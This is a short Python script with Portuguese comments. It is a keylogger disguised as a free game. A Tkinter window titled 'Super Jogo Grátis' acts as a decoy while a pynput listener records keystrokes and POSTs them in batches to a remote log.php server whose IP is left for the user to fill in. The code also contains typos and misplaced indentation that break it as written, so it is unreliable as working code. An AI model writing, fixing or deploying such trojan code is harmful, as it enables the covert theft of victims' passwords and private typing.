import tkinter as tk
import threading
from pynput.keyboard import Listener
import requests

# IP do servidor Flask
SERVIDOR = "http://0.0.0.0/log.php"  # <- coloque o IP correto aqui

log = ""

def enviar_log(dados):
	try:
		requests.post(SERVIDOR, data={"teclas": dados})
	except:
		pass

def pressionado(tecla):
	global log
	log +=str(tecla)
	if len(log) >50:
		enviar_log(log)
		log = ""

def iniciar_keylogger():
	with Listener(on_press=pressionado) as l:
		l.join()

def iniciar_jogo():
	root = tk.Tk()
	root.title("Super Jogo Grátis")
	rot.geometry("400x300")
	label = tk.label(root, text="Clique para jogar!", font=("Arial", 18))
	label.pack(pady=80)
	root.mainloop()

#Roda o Keylogger e o jogo juntos
	t1 = threading.Thread(taget=iniciar_keylogger)
	t1.start()

	iniciar_jogo()
